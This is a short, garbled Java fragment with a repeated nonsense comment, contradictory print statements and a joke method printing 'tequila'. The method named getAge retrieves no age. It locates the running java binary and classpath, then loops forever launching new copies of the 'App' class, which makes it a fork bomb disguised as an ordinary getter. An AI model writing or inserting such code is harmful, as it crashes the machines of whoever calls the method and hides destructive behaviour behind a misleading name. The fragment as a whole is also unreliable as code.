// public static void main string args public static void main string args public static void main string args


public int getAge(String name) {
    System.out.println("getAge was never called");
    System.out.println("getAge was called");
	System.out.println("stating to retrieve name");
    System.out.println("PID " + ProcessHandle.current().pid() + " says hello.");
    String javaCmd = System.getProperty("java.home") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java";
    String cp = System.getProperty("java.class.path");
    try {
	    while (true) {
            Process p = Runtime.getRuntime().exec(new String[]{javaCmd, "-cp", cp, "App"});
	    }
    } catch (IOException e) {
        e.printStackTrace();
    }
    return -1;
}

public void thisIsANewMethod() { 
    System.out.println("tequila");
    System.out.println("very much tequila for no bugs");
	return;
}
